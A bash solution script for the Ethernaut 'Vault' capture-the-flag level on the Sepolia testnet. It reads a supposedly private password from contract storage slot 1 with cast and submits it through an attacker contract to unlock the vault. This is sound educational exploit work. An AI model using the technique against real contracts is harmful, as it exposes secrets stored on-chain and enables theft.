#!/bin/bash
# script/levels/08_Vault/attack.sh
# Vault Attack Script - Read storage slot 1 and unlock the vault
#
# Usage:
#   bash script/levels/08_Vault/attack.sh <ATTACKER_ADDRESS>
#
# Example:
#   bash script/levels/08_Vault/attack.sh 0xf0878A84C92473adAEeF2BA8F0f0d5Aa2599EFB8
#
# Requirements:
#   - .env file with SEPOLIA_RPC_URL and PRIVATE_KEY
#   - Attacker contract deployed
#   - Target at VAULT_TARGET in .env

set -e  # Exit on error

# Load environment
if [ ! -f .env ]; then
    echo "❌ Error: .env file not found"
    echo "Please create .env from .env.example"
    exit 1
fi

source .env

# Configuration
ATTACKER_ADDRESS="${1}"
TARGET_ADDRESS="${VAULT_TARGET}"

# Validate inputs
if [ -z "$ATTACKER_ADDRESS" ]; then
    echo "❌ Error: Attacker address required"
    echo "Usage: bash script/levels/08_Vault/attack.sh <ATTACKER_ADDRESS>"
    exit 1
fi

if [ -z "$TARGET_ADDRESS" ]; then
    echo "❌ Error: VAULT_TARGET not set in .env"
    exit 1
fi

if [ -z "$SEPOLIA_RPC_URL" ] || [ -z "$PRIVATE_KEY" ]; then
    echo "❌ Error: SEPOLIA_RPC_URL and PRIVATE_KEY required in .env"
    exit 1
fi

echo "╔════════════════════════════════════════════════════════╗"
echo "║             Vault CTF - Attack Script                 ║"
echo "╚════════════════════════════════════════════════════════╝"
echo ""
echo "Attacker: $ATTACKER_ADDRESS"
echo "Target:   $TARGET_ADDRESS"
echo "RPC:      ${SEPOLIA_RPC_URL:0:40}..."
echo ""

# Step 1: Read password from storage slot 1
echo "📖 Reading password from storage slot 1..."
PASSWORD=$(cast storage "$TARGET_ADDRESS" 1 --rpc-url "$SEPOLIA_RPC_URL")
echo "🔓 Password found: $PASSWORD"
echo ""

# Step 2: Call attack() function with password
echo "🚀 Sending attack transaction..."
TX_RESULT=$(cast send "$ATTACKER_ADDRESS" "attack(bytes32)" "$PASSWORD" \
    --rpc-url "$SEPOLIA_RPC_URL" \
    --private-key "$PRIVATE_KEY" 2>&1)

if echo "$TX_RESULT" | grep -q "blockNumber"; then
    echo "   ✓ Transaction successful!"
    echo ""

    # Step 3: Verify vault is unlocked
    echo "🔍 Verifying vault status..."
    IS_LOCKED=$(cast call "$TARGET_ADDRESS" "locked()" --rpc-url "$SEPOLIA_RPC_URL")

    if [ "$IS_LOCKED" = "false" ]; then
        echo "   ✓ Vault is UNLOCKED!"
    else
        echo "   ⚠️  Vault still locked (unexpected)"
    fi
else
    echo "   ✗ Transaction failed!"
    echo "   Error: $TX_RESULT"
    exit 1
fi

echo ""
echo "╔════════════════════════════════════════════════════════╗"
echo "║              🎉 ATTACK SUCCESSFUL! 🎉                 ║"
echo "╚════════════════════════════════════════════════════════╝"
echo ""
echo "✅ Next step: Submit instance on https://ethernaut.openzeppelin.com/level/8"
echo ""
